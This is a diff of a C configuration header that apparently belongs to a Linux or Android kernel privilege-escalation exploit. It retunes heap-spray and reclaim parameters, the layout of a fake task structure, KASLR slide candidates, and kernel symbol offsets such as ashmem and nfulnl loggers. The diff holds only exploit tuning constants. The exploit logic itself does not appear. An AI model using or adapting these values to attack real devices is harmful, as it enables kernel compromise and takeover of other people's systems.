@@ -26,7 +26,7 @@
 #define APP_FOPS_DEFER_ALIAS_READBACK 1
 #define APP_FOPS_DURABLE_POSTWRITE_LOG 1
 #define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
-#define APP_FOPS_TABLE_MIRROR_OFF 0x0800
+#define APP_FOPS_TABLE_MIRROR_OFF 0x1e80
 #define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #define APP_PHYS_P0_ORACLE 1
 #else
@@ -59,7 +59,7 @@
 // ============================================================================
 // SKB DATA DELTA
 // ============================================================================
-#define SKB_DATA_DELTA (-0xe70LL)
+#define SKB_DATA_DELTA (-0xe60LL)
 
 // ============================================================================
 // RECLAIM / HEAP SPRAY CONFIGS
@@ -71,8 +71,8 @@
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
 #define APP_QUIET_RECLAIM_WINDOW 1
-#define APP_SLIDE_MIN_OBJECT_INDEX 2
-#define APP_SLIDE_MAX_OBJECT_INDEX 28
+#define APP_SLIDE_MIN_OBJECT_INDEX 5
+#define APP_SLIDE_MAX_OBJECT_INDEX 20
 #define APP_FOPS_MIN_OBJECT_INDEX 24
 #define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
 #define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
@@ -89,7 +89,7 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000def04ULL
-#define SLIDE_PSELECT_WORD_SHIFT 3
+#define SLIDE_PSELECT_WORD_SHIFT 0
 #define SLIDE_P0_OFFSET_CANDIDATES  \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,  \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL,  \
@@ -170,7 +170,7 @@
 #define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01598a0aULL
 #define NFULNL_LOGGERS_OFF 0x021129a8ULL
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02245468ULL
-#define ASHMEM_MISC_FOPS_OFF 0x01265098ULL
+#define ASHMEM_MISC_FOPS_OFF 0x0228a218ULL
 
 // ============================================================================
 // COMPUTED ABSOLUTE ADDRESSES
@@ -233,7 +233,7 @@
 // ============================================================================
 // FAKE TASK LAYOUT
 // ============================================================================
-#define FAKE_TASK_OFF 0x00c0
+#define FAKE_TASK_OFF 0x3200
 #define FAKE_TASK_USAGE_OFF 0x40
 #define FAKE_TASK_PRIO_OFF 0x84
 #define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
@@ -246,12 +246,12 @@
 // ============================================================================
 // OUTRAS STRUCTS
 // ============================================================================
-#define LOCK_OFF 0x0000
-#define W0_OFF 0x0040
-#define FOPS_OFF 0x0a40
-#define SCRATCH_OFF 0x0c00
-#define RIGHT_OFF 0x0bc0
-#define LEFT_OFF 0x0b80
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
 
 #define CFG_PAGE_OFF 16
 #define CFG_NEEDS_READ_FILL_OFF 80
